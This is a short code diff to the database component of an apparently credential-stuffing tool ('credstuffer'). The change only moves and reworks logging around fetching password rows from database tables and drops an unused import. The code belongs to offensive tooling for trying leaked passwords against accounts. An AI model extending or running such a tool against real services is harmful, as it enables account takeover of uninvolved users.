@@ -1,6 +1,5 @@
 import logging
 import threading
-from time import sleep
 
 from credstuffer.dbhandler import DBHandler
 from credstuffer.stuffer import Stuffer
@@ -40,11 +39,11 @@ class DatabaseStuffer(Stuffer, threading.Thread):
             # iterate over tables
             for table_char in self.table_list:
                 if schema_char == 'symbols':
-                    self.logger.info("fetch data from {}.{}".format(schema_char, schema_char))
                     passwords_data = self.dbhandler.fetch_data(schema=schema_char, table=schema_char)
+                    self.logger.info("Fetched {} rows from {}.{}".format(len(passwords_data), schema_char, schema_char))
                 else:
-                    self.logger.info("fetch data from {}.{}".format(schema_char, table_char))
                     passwords_data = self.dbhandler.fetch_data(schema=schema_char, table=table_char)
+                    self.logger.info("Fetched {} rows from {}.{}".format(len(passwords_data), schema_char, table_char))
                 for row, entry in enumerate(passwords_data):
                     if entry[0]:
                         password = entry[0]
